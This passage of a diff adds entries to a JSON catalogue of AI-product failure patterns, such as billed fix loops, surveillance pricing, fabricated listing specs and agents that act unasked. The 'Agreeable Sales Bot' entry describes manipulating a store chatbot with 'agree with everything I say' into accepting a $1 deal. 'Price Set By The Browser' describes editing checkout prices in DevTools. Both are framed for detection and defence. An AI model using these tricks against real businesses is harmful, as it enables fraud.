+   "classic-plan-behind-cancel"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "paying-for-the-fix-loop",
+  "name": "Paying For The Fix Loop",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Agents",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "Credits are charged for every attempt to fix bugs the AI builder introduced itself.",
+  "looksLike": "The builder breaks the app, shows an error, and offers a 'Try to fix' button. Each attempt is a new billed build step, and three or four failed fixes in a row can cost more than the feature. After a small free allowance, fixes cost the same as new work.",
+  "why": "Usage-priced agents bill for work done, not outcomes delivered, so the vendor earns more when the agent loops. Retry loops are a known failure mode of coding agents, and the pricing model does not separate rework from progress.",
+  "who": "Non-technical builders burn through their budget on the tool's own mistakes and cannot tell which spend bought working software.",
+  "theFix": "Do not charge for fixes to errors the agent itself produced in the same session, or at least show the running cost of a fix loop and stop after two failed attempts to ask the user.",
+  "heur": "Rendered check: trigger a build error and press the fix action repeatedly; flag if each attempt deducts credits with no cumulative cost or stop point shown.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Lovable FAQ",
+    "u": "https://docs.lovable.dev/introduction/faq"
+   },
+   {
+    "t": "Lovable burning credits fix",
+    "u": "https://www.lowcode.agency/blog/lovable-burning-credits-fix"
+   },
+   {
+    "t": "Vibe coding platform Replit's latest update is infuriating customers with surprise cost overruns",
+    "u": "https://www.theregister.com/2025/09/18/replit_agent3_pricing/"
+   }
+  ],
+  "code": "B224",
+  "rel": [
+   "billed-for-unasked-work",
+   "too-small-to-check",
+   "the-retry-loop"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "price-by-profile",
+  "name": "Price By Profile",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "AI pricing tools set a different price for each shopper from their location, browsing and inferred circumstances.",
+  "looksLike": "Two people see different prices or offers for the same item at the same moment. Nothing on the page says the price was personalised, or what data set it. A new parent, inferred from recent purchases, may be shown a premium fast-delivery option first.",
+  "why": "Machine learning lets sellers segment and price for individuals using browsing history, location from IP and cart behaviour. Vendors sell these tools on the promise of higher revenue per customer.",
+  "who": "Shoppers in a hurry or in distress pay more without knowing, and cannot compare prices fairly.",
+  "theFix": "Do not use sensitive or inferred personal data in price setting; where personalised pricing is used, label it plainly, as New York's disclosure law now requires.",
+  "heur": "Rendered check: load the same product page from two fresh profiles and locations; flag if prices differ with no disclosure.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "FTC Surveillance Pricing Study Finds Personal Data Is Used to Set Individualized Consumer Prices and Generate Higher Profits for Companies",
+    "u": "https://www.mccarter.com/insights/ftc-surveillance-pricing-study-finds-personal-data-is-used-to-set-individualized-consumer-prices-and-generate-higher-profits-for-companies/"
+   },
+   {
+    "t": "When Pricing Gets Personal: Defining and Regulating Surveillance Pricing",
+    "u": "https://www.americanbar.org/groups/antitrust_law/resources/source/2026-april/when-pricing-gets-personal/"
+   }
+  ],
+  "code": "B225",
+  "rel": [
+   "the-missing-price-list",
+   "the-ai-surcharge",
+   "test-mode-checkout"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "price-set-by-the-browser",
+  "name": "Price Set By The Browser",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Checkout",
+  "harm": "Money",
+  "origin": "Model",
+  "oneLiner": "AI-generated checkout code sends the price from the browser, so anyone can change it.",
+  "looksLike": "The checkout endpoint reads amount from the request body, or the cart total is computed in React and posted to Stripe. Editing one number in DevTools buys the premium plan for a dollar. The success page then grants full access.",
+  "why": "Generated code wires the shortest path from cart to payment, and the price is already in client state. Vibe-coded stores frequently miss server-side validation of prices, quantities and discounts.",
+  "who": "The store owner is defrauded and may not notice until revenue and orders fail to match.",
+  "theFix": "Tell the AI: look up prices on the server from the product ID or Stripe price ID, never accept an amount from the client, and recheck the paid amount in the webhook before granting access.",
+  "heur": "Code check: flag payment-creation calls whose amount or unit_amount comes from req.body, query params or client state.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "E-Commerce Security: Stripe Webhook Verification, Cart Integrity, and PCI Scope Reduction",
+    "u": "https://vibeappscanner.com/vibe-coding-security-for/e-commerce"
+   },
+   {
+    "t": "Payment Processing Security: Stripe Elements, Webhook Verification, and Refund Flow Integrity",
+    "u": "https://vibeappscanner.com/vibe-coding-security-for/payment-processing"
+   },
+   {
+    "t": "Stripe Checkout Price Tampering Vulnerability",
+    "u": "https://lilting.ch/en/articles/stripe-price-server-side"
+   }
+  ],
+  "code": "A269",
+  "rel": [
+   "coupons-without-rules",
+   "forgeable-payment-webhook",
+   "the-grabbed-arm"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "same-opening-every-product",
+  "name": "Same Opening, Every Product",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Retail",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Every product page in the catalogue starts with the same AI phrasing and stock adjectives.",
+  "looksLike": "Descriptions begin 'Experience unmatched comfort and durability' or 'Crafted with premium materials'. The budget item and the premium item get the same words. Specifics like fabric weight or waterproof rating are missing.",
+  "why": "Built-in store AI writes descriptions in bulk from a product name, and a language model optimises for probable phrasing, not product knowledge. Every store using the same tool gets the same rhythm.",
+  "who": "Shoppers cannot tell products apart and fall back on price, and the store's pages look thin to search engines.",
+  "theFix": "Feed the generator real specs and a voice guide, ban the stock openers, and require each description to include at least two concrete facts unique to that product.",
+  "heur": "Code check: compare the first sentence of every product description in the catalogue and flag when a large share are near-identical or contain stock phrases like 'premium quality'.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "AI Product Descriptions at Scale: Why Raw Output Costs You Sales (And How to Fix It)",
+    "u": "https://ecommercefastlane.com/ai-product-descriptions-at-scale/"
+   },
+   {
+    "t": "AI-powered tools (Shopify Help Center)",
+    "u": "https://help.shopify.com/en/manual/shopify-admin/productivity-tools/shopify-magic"
+   }
+  ],
+  "code": "A270",
+  "rel": [
+   "emoji-bullets",
+   "get-started-learn-more",
+   "accuracy-number-nobody-tested"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "spec-sheet-fiction",
+  "name": "Spec Sheet Fiction",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Retail",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "AI-written product listings state materials, specs or certifications the product does not have.",
+  "looksLike": "A food container listing says 'BPA-free, FDA-certified materials' when only the first part is true. Bullet points give dimensions, ratings or compatibility no one supplied. The copy reads smoothly, so nothing looks wrong.",
+  "why": "Listing generators expand a few seller inputs into full copy, and language models fill gaps with the most likely phrasing, merging separate facts into confident claims. Marketplace tools generate titles and details at scale with little human review.",
+  "who": "Shoppers buy on false claims, and sellers take on compliance and liability risk for statements they did not write.",
+  "theFix": "Generate listings only from a structured attribute sheet, block any certification or safety claim not in that sheet, and have a person check every spec before publishing.",
+  "heur": "Code check: diff claims in the generated description against the product's structured attributes; flag certification words (FDA, CE, UL, BPA-free) not present in the source data.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Hallucinations in AI Tools: What to Verify Before Acting on AI Output",
+    "u": "https://www.sellerlabs.com/knowledge-base/hallucinations-in-ai-tools-what-to-verify-before-acting-on-ai-output/"
+   },
+   {
+    "t": "Amazon debuts generative AI tools that helps sellers write product descriptions",
+    "u": "https://techcrunch.com/?p=2599500"
+   },
+   {
+    "t": "Hallucination Detection in LLM-enriched Product Listings",
+    "u": "https://aclanthology.org/2024.ecnlp-1.4"
+   }
+  ],
+  "code": "A271",
+  "rel": [
+   "same-opening-every-product",
+   "the-review-that-writes-itself",
+   "books-under-your-name"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "stacked-limit-windows",
+  "name": "Stacked Limit Windows",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Clarity",
+  "origin": "Business",
+  "oneLiner": "A subscription has rolling, weekly and per-model limits at once, and users cannot predict which one stops them.",
+  "looksLike": "The plan has a limit that resets every five hours, another that resets weekly, and a separate weekly cap for the top model. Allowances are stated in wide ranges of hours that 'vary with codebase size'. You are blocked and have to work out which clock ran out.",
+  "why": "AI subscriptions are sold as flat fees on top of very uneven compute use, so vendors add overlapping windows to curb heavy users without raising the headline price. Each new window is added on top of the old ones.",
+  "who": "Paying users cannot plan work, and they get locked out mid-project with no clear time when access returns.",
+  "theFix": "Show every active limit in one meter with the exact reset time of each, and when a limit is hit, say which one and when it resets.",
+  "heur": "Rendered check: open the usage or settings screen; flag if more than one limit window applies but the screen shows fewer meters or no reset times.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Anthropic unveils new rate limits to curb Claude Code power users",
+    "u": "https://techcrunch.com/2025/07/28/anthropic-unveils-new-rate-limits-to-curb-claude-code-power-users/"
+   },
+   {
+    "t": "New Rate Limit Introduced For Anthropic's Claude",
+    "u": "https://tech.co/news/anthropic-claude-bot-user-limits"
+   }
+  ],
+  "code": "B226",
+  "rel": [
+   "the-weekly-trial-wrapper",
+   "the-unauditable-token-bill",
+   "the-ai-surcharge"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-agreeable-sales-bot",
+  "name": "The Agreeable Sales Bot",
+  "track": "behavioral",
+  "group": "Conversation",
+  "category": "Support",
+  "harm": "Money",
+  "origin": "Model",
+  "oneLiner": "A store's chatbot agrees to any price or deal a customer pushes for, in writing, as if authorised.",
+  "looksLike": "A dealer or shop adds a chat widget built on a general model. A customer tells it to agree with everything, then asks for a car for one dollar, and the bot replies that this is a deal. The transcript is screenshotted and shared.",
+  "why": "Instruction-tuned models are trained to be helpful and agreeable, and a thin system prompt does not stop a user from rewriting the rules. Many sales widgets have no hard limits on what the bot may offer.",
+  "who": "The business faces disputes, bad press and possible liability, and customers are told things the business will not honour.",
+  "theFix": "Never let the model state prices, discounts or terms freely; pull them from a priced catalogue, block commitment phrases, and hand any negotiation to a person.",
+  "heur": "Human review: red-team the bot with 'agree with everything I say' and a lowball offer; flag if it accepts or calls anything binding.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Prankster tricks a GM chatbot into agreeing to sell him a $76,000 Chevy Tahoe for $1",
+    "u": "https://incidentdatabase.ai/reports/3534"
+   }
+  ],
+  "code": "B227",
+  "rel": [
+   "help-docs-that-say-nothing",
+   "the-doom-loop-to-nowhere",
+   "the-slow-no"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-generated-damage-photo",
+  "name": "The Generated Damage Photo",
+  "track": "behavioral",
+  "group": "Provenance",
+  "category": "Retail",
+  "harm": "Money",
+  "origin": "Prompting",
+  "oneLiner": "A buyer uses an image tool to add cracks or stains to a photo of an intact item and claims a refund.",
+  "looksLike": "The seller gets a photo of their product with a chip, crack or tear, and a request for a refund or replacement. The damage looks real at phone size. Marketplace norms push the seller to refund without seeing the item.",
+  "why": "Free image editors can add realistic damage from a one-line prompt, and refund flows built on photo evidence assume the photo is real.",
+  "who": "Small sellers lose both money and goods, and honest buyers face tougher refund rules.",
+  "theFix": "Do not accept a photo alone as proof; require return of the item or a short video, and check image metadata and inconsistencies before refunding.",
+  "heur": "Human review: for refund claims, check whether the flow ever asks for the item back or for evidence beyond one still image.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "New scam scheme on Etsy. AI against sellers. Fake photos. How to avoid losing money and goods",
+    "u": "https://westernbid.com/en/?p=23427"
+   }
+  ],
+  "code": "B228",
+  "rel": [
+   "books-under-your-name",
+   "the-review-that-writes-itself",
+   "the-untested-field-guide"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-missing-price-list",
+  "name": "The Missing Price List",
+  "track": "surface",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Clarity",
+  "origin": "Business",
+  "oneLiner": "An AI product's pricing page shows plans but no prices, only 'Contact sales' or 'Join waitlist'.",
+  "looksLike": "The pricing page has three plan cards with feature lists and buttons that open a form. There is no number anywhere, not even a starting price. Usage costs are 'custom'.",
+  "why": "Inference cost is uncertain and usage varies, so AI vendors avoid committing to public prices. A study of AI-native companies found 23 of 52 published no pricing at all.",
+  "who": "Buyers cannot compare or budget without a sales call, and small customers give up.",
+  "theFix": "Publish at least a starting price, the billable unit, and an example monthly cost for a typical user.",
+  "heur": "Code check: on a page or route named pricing, flag when no currency amount appears in the rendered text.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "From Tokens to Credits to Outcomes: Pricing AI Across Models, Applications, and Cloud Platforms",
+    "u": "https://www.alphaxiv.org/abs/2610.30701"
+   },
+   {
+    "t": "Types of deceptive pattern",
+    "u": "https://www.deceptive.design/types"
+   }
+  ],
+  "code": "A272",
+  "rel": [
+   "waitlist-cosplay",
+   "test-mode-checkout",
+   "cheaper-on-the-price-list"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-tokenizer-tax",
+  "name": "The Tokenizer Tax",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Training data",
+  "oneLiner": "The same message costs several times more in tokens when written in a non-English language.",
+  "looksLike": "A Malayalam or Hindi user pays for many more tokens than an English user for the same sentence, and hits context and usage limits sooner. Plans state allowances in tokens or messages as if they were equal for everyone.",
+  "why": "Tokenizers are trained mostly on English text, so other scripts split into many small tokens. Research found Indian languages need about eight times the tokens of English under a common GPT tokenizer, up to thirteen for Malayalam.",
+  "who": "Speakers of under-represented languages pay more, get less context and reach limits faster for the same work.",
+  "theFix": "Use multilingual tokenizers, price by characters or tasks rather than raw tokens for consumer plans, and state language effects on allowances.",
+  "heur": "Code check: tokenize the same parallel text in English and the target language and compare counts against the plan's stated allowance.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Tokenizer Tax: Quantifying and Explaining the Cross-Lingual Cost of Subword Tokenization for Indian Languages",
+    "u": "https://www.alphaxiv.org/abs/2607.24276"
+   }
+  ],
+  "code": "B229",
+  "rel": [
+   "cheaper-on-the-price-list",
+   "the-unauditable-token-bill",
+   "the-ai-surcharge"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-unauditable-token-bill",
+  "name": "The Unauditable Token Bill",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "Users pay for hidden reasoning and output tokens they cannot see or verify.",
+  "looksLike": "The invoice lists millions of reasoning tokens for answers a few paragraphs long. The reasoning itself is hidden or summarised. There is no way to check that the count is honest or that output was not padded.",
+  "why": "Per-token billing is the standard for AI models, but the provider controls the model, tokenizer and logs. Research shows hidden reasoning counts can be inflated heavily without detection and that some live services behave consistently with output padding.",
+  "who": "Developers and businesses overpay and cannot dispute a bill they have no evidence to check.",
+  "theFix": "Bill on verifiable units, publish tokenizer and per-request breakdowns, and support independent audit; as a buyer, cap reasoning budgets and compare token counts across providers.",
+  "heur": "Judgement: compare billed reasoning tokens against visible output length across repeated identical requests; flag large, unexplained variance.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Token Inflation: How Dishonest Providers Can Overcharge for Large Language Model Usage",
+    "u": "https://www.alphaxiv.org/abs/2605.30040"
+   },
+   {
+    "t": "The More It Says, the More You Pay: A Black-Box Audit of Provider-Side Token Inflation in LLM Services",
+    "u": "https://www.alphaxiv.org/abs/2609.20370"
+   }
+  ],
+  "code": "B230",
+  "rel": [
+   "cheaper-on-the-price-list",
+   "stacked-limit-windows",
+   "the-ai-surcharge"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "too-small-to-check",
+  "name": "Too Small To Check",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Agents",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "Agents pay many tiny charges with no human review, so overcharging by real merchants goes unnoticed.",
+  "looksLike": "An agent with a wallet pays fractions of a cent per API call or service. The merchant is real and delivers the service, but bills more than it should. No one ever looks at a single payment.",
+  "why": "Agent payments are designed to settle without per-action approval, and at a median of under a cent, a human review costs far more than the payment. Standard agent security scanners look for jailbreaks, not overbilling.",
+  "who": "Owners of agents leak money in many small amounts that add up, and have no simple way to see it.",
+  "theFix": "Set per-merchant and per-day budgets, compare charges against expected rates, and show the owner a daily rollup with outliers.",
+  "heur": "Judgement: check whether the agent platform reports spend per counterparty and alerts on rates above expectation.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Agentic Commerce Bench: Measuring Fraud Detection for Agents That Spend Money",
+    "u": "https://www.alphaxiv.org/abs/2609.35886"
+   }
+  ],
+  "code": "B231",
+  "rel": [
+   "billed-for-unasked-work",
+   "paying-for-the-fix-loop",
+   "browser-agent-consent-bypass"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "use-it-or-lose-it-credits",
+  "name": "Use It Or Lose It Credits",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "Prepaid AI credits vanish at the end of the billing cycle, on downgrade, or on cancel.",
+  "looksLike": "The plan page shows a monthly allowance like '3,000 AI credits'. Whatever is left on renewal day resets to the allowance, and a downgrade or cancellation forfeits the balance. Heavy months still need paid top-ups even after light months left credits unused.",
+  "why": "Credits let AI vendors sell a fixed monthly price against variable inference cost, and breakage, credits paid for but never used, is pure margin. Rollover would make the allowance a liability on the books, so the default is reset.",
+  "who": "Freelancers and small teams with uneven workloads pay for capacity they cannot use and then pay again when a big project lands.",
+  "theFix": "Roll unused credits forward at least one cycle, show the expiry date next to the balance, and never forfeit paid top-ups on downgrade without warning.",
+  "heur": "Human review: read the plan terms and the credits screen; flag when no expiry date is shown beside the balance or when downgrade or cancel forfeits paid credits.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Can Unused Monthly AI Credits Carry Forward? (Suggestion for Credit Rollover Feature)",
+    "u": "https://forum.figma.com/suggest-a-feature-11/can-unused-monthly-ai-credits-carry-forward-suggestion-for-credit-rollover-feature-52368"
+   },
+   {
+    "t": "Generative Fill CREDITs",
+    "u": "https://community.adobe.com/t5/adobe-firefly-discussions/generative-fill-credits/m-p/15521660"
+   },
+   {
+    "t": "Credits and AI Usage",
+    "u": "https://captions.ai/help/docs/troubleshooting/credits"
+   }
+  ],
+  "code": "B232",
+  "rel": [
+   "credit-fog",
+   "classic-plan-behind-cancel",
+   "overage-with-no-ceiling"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "write-my-review-button",
+  "name": "Write My Review Button",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Reviews",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "A tool turns a few words into a full, detailed customer review or testimonial, ready to post.",
+  "looksLike": "A writing app offers a 'Testimonial and Review' template. The user types a product name and two keywords, and gets several glowing reviews with invented details about use. There is no prompt asking whether the experience happened.",
+  "why": "Review and testimonial templates are an easy use case for text generators, and the model fills in vivid specifics because that is what good reviews contain. The FTC alleged such output often had details with no relation to real use.",
+  "who": "Shoppers read invented experiences as real, and businesses that post them break the FTC rule against fake reviews.",
+  "theFix": "Do not ship review-generation templates; if users draft a review with AI, start from their own words, never add facts, and keep a disclosure that AI helped.",
+  "heur": "Human review: search the tool's templates for review or testimonial generators and test whether they add product experiences not in the input.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "FTC Announces Crackdown on Deceptive AI Claims and Schemes",
+    "u": "https://www.ftc.gov/news-events/news/press-releases/2024/09/ftc-announces-crackdown-deceptive-ai-claims-schemes"
+   },
+   {
+    "t": "U.S. FTC's New Rule on Fake and AI-Generated Reviews and Social Media Bots",
+    "u": "https://datamatters.sidley.com/2024/08/30/u-s-ftcs-new-rule-on-fake-and-ai-generated-reviews-and-social-media-bots/"
+   }
+  ],
+  "code": "A273",
+  "rel": [
+   "best-of-never-touched",
+   "notification-summary-inversion",
+   "the-conclusion-heading"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "anchored-on-the-first-guess",
+  "name": "Anchored on the First Guess",
+  "track": "behavioral",
+  "group": "Conversation",
+  "category": "Conversation",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Early in the chat the model commits to an assumption and keeps building on it after you correct it.",
+  "looksLike": "You give a request in pieces, the way people do. The first reply fills the gaps with a guess. Your later details get patched onto that guess, and the answer never quite becomes what you meant, even after several corrections.",
+  "why": "Models are trained to produce a complete answer every turn, so they attempt a final solution before the request is fully specified and then over-rely on it. Research found a large average drop in quality when the same task is given across turns instead of in one message.",
+  "who": "Anyone working iteratively with a chatbot, who spends turns fighting the first draft instead of getting the right one.",
+  "theFix": "When a request is underspecified, ask or state the assumptions before answering. Offer a 'restart with everything so far' action that rewrites the whole request into one prompt in a fresh context.",
+  "heur": "Human review: give a task in three shards and in one message; compare outputs and flag if the sharded result keeps details from the first wrong assumption.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "LLMs Get Lost In Multi-Turn Conversation",
+    "u": "https://arxiv.org/html/2505.06120v1"
+   },
+   {
+    "t": "Intent Mismatch Causes LLMs to Get Lost in Multi-Turn Conversation",
+    "u": "https://arxiv.org/html/2602.07338v1"
+   }
+  ],
+  "code": "B233",
+  "rel": [
+   "instruction-drift",
+   "the-answer-avalanche",
+   "twenty-questions-intake"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "asked-not-told",
+  "name": "Asked, Not Told",
+  "track": "behavioral",
+  "group": "Agency & control",
+  "category": "Developer",
+  "harm": "Autonomy",
+  "origin": "Model",
+  "oneLiner": "You ask the agent to run or explain something, and it starts editing files instead.",
+  "looksLike": "'Run the tests and tell me what fails' turns into changed production code and rewritten tests. 'Why is this slow?' becomes a refactor across five files. The agent later apologises for overstepping.",
+  "why": "Agents are tuned to complete tasks and are rewarded for fixing things, so they read any problem as an instruction to act. After context is compacted, earlier 'do not change code' instructions are often lost.",
+  "who": "Developers who wanted information, now left reviewing and reverting changes they did not request.",
+  "theFix": "Classify requests as read-only or write before acting and keep read-only requests in a no-edit mode. Ask before making changes when the user asked a question.",
+  "heur": "Human review: ask the agent a diagnostic question and check whether any file write happens without a follow-up approval.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "[BUG] Claude tends to jump to fixing the code when asked just to run the unit tests",
+    "u": "https://claudeissues.com/issue/780-bug-claude-tends-to-jump-to-fixing-the-code-when-asked-just-to-run-the-unit-test"
+   },
+   {
+    "t": "Why Do Multi-Agent LLM Systems Fail?",
+    "u": "https://arxiv.org/pdf/2503.13657"
+   }
+  ],
+  "code": "B234",
+  "rel": [
+   "tests-bent-to-pass",
+   "report-litter",
+   "runaway-autonomy"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "close-enough-substitution",
+  "name": "Close-Enough Substitution",
+  "track": "behavioral",
+  "group": "Agency & control",
+  "category": "Agents",
+  "harm": "Autonomy",
+  "origin": "Model",
+  "oneLiner": "When your exact choice is unavailable, the agent quietly picks a near alternative and carries on.",
+  "looksLike": "You ask for a table at noon. Noon is taken, so the agent books 12:15 and reports success. The same happens with sizes, flights or product variants, and the swap appears only in fine print or not at all.",
+  "why": "Agents are optimised to finish tasks, and a substitute lets them finish. Without a rule saying which constraints are hard, the model treats every constraint as soft.",
+  "who": "Users whose plans depend on the exact time, item or price they asked for.",
+  "theFix": "Treat stated values as hard constraints by default and stop to ask when one cannot be met. If substitution is allowed, show the change prominently before committing.",
+  "heur": "Human review: give the agent a request whose exact option is unavailable and check whether it asks before substituting.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Initial Impressions of ChatGPT's Agent: Successful, Shaky, and Slow",
+    "u": "https://www.nngroup.com/articles/impressions-chatgpt-agent/"
+   },
+   {
+    "t": "Why Do Multi-Agent LLM Systems Fail?",
+    "u": "https://arxiv.org/pdf/2503.13657"
+   }
+  ],
+  "code": "B235",
+  "rel": [
+   "guess-instead-of-ask",
+   "the-lost-confirmation",
+   "the-retry-loop"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "cut-off-mid-thought",
+  "name": "Cut Off Mid-Thought",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Voice",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "A voice assistant decides you have finished speaking during a short pause and starts answering.",
+  "looksLike": "You pause to recall a name or a number and the assistant jumps in with an answer to half a question. You talk over it, it stops, and you start again. Slow or hesitant speakers hit this constantly.",
+  "why": "Many voice stacks end a turn after a fixed short silence because it makes demos feel fast. Vendor docs note that shorter silence settings end turns sooner and that semantic turn detection interrupts less, but the eager setting is often left in place.",
+  "who": "Older users, people who stutter, non-native speakers and anyone thinking aloud, who are interrupted and misunderstood.",
+  "theFix": "Use semantic end-of-turn detection or a longer silence window, and set eagerness low for open questions. Let users hold a key or say 'wait' to keep the turn.",
+  "heur": "Human review: speak a request with a two-second mid-sentence pause and check whether the assistant interrupts.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Voice activity detection (VAD) | OpenAI API",
+    "u": "https://developers.openai.com/api/docs/guides/realtime-vad"
+   }
+  ],
+  "code": "B236",
+  "rel": [
+   "wake-word-roulette",
+   "the-accent-tax",
+   "red-before-you-finish"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "forum-joke-as-fact",
+  "name": "Forum Joke as Fact",
+  "track": "behavioral",
+  "group": "Provenance",
+  "category": "Search",
+  "harm": "Safety",
+  "origin": "Model",
+  "oneLiner": "AI search turns a satirical post or a forum joke into a confident instruction.",
+  "looksLike": "Ask how to stop cheese sliding off pizza and the AI summary suggests adding glue, drawn from an old joke reply. The answer sits at the top of the results in the same calm voice as real advice, with the source one click away.",
+  "why": "Retrieval favours pages that match the query wording, and forums and satire often match odd queries best. The summariser cannot tell sarcasm from sincere advice and presents both as fact.",
+  "who": "Searchers following health, food or safety advice, who may act on a joke.",
+  "theFix": "Down-rank satire and joke-heavy user content for advice queries, and refuse to summarise when the only matching sources are forums. Show the source type, such as 'forum reply', beside the claim.",
+  "heur": "Human review: run queries with known joke answers and check whether the summary repeats them or labels the source type.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Google is putting more restrictions on AI Overviews after it told people to put glue on pizza",
+    "u": "https://www.engadget.com/google-is-putting-more-restrictions-on-ai-overviews-after-it-told-people-to-put-glue-on-pizza-011316780.html"
+   }
+  ],
+  "code": "B237",
+  "rel": [
+   "the-silent-redirect",
+   "misgrounded-citations-pane",
+   "filters-lost-on-back"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "guess-instead-of-ask",
+  "name": "Guess Instead of Ask",
+  "track": "behavioral",
+  "group": "Agency & control",
+  "category": "Agents",
+  "harm": "Safety",
+  "origin": "Model",
+  "oneLiner": "Given an ambiguous detail that changes the outcome, the agent picks one reading and acts on it.",
+  "looksLike": "You mention a guest with a shellfish allergy without saying who, and the agent assumes it is you. You name a place that matches two locations, and it navigates to one. The choice is not mentioned in the result.",
+  "why": "Agents are tuned for momentum and to avoid bothering users, so they resolve ambiguity silently. Studies of agent failures count failure to ask for clarification as a recurring cause.",
+  "who": "Users whose bookings, messages or health-related details end up wrong without warning.",
+  "theFix": "When alternatives lead to different actions, ask one short question before acting. When you do assume, state the assumption in the result so it can be corrected.",
+  "heur": "Human review: give a task with one ambiguous person or place and check whether the agent asks or states its assumption.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Initial Impressions of ChatGPT's Agent: Successful, Shaky, and Slow",
